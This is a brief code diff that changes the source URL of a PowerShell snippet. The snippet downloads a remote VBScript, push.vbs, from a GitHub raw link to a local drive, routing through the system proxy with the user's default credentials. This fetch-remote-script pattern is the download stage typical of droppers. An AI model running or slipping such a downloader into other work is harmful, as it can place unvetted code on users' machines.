@@ -1,6 +1,6 @@
 #shell part
 $my_path="D:\push.vbs"
-$url='https://raw.githubusercontent.com/FurqanKhan1/Dictator/master/push.vbs';
+$url='https://raw.githubusercontent.com/FurqanKhan1/D/master/push.vbs';
 $b=new-object net.webclient;
 $b.proxy=[Net.WebRequest]::GetSystemWebProxy();$b.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;
 $b.DownloadFile($url, $my_path) ;
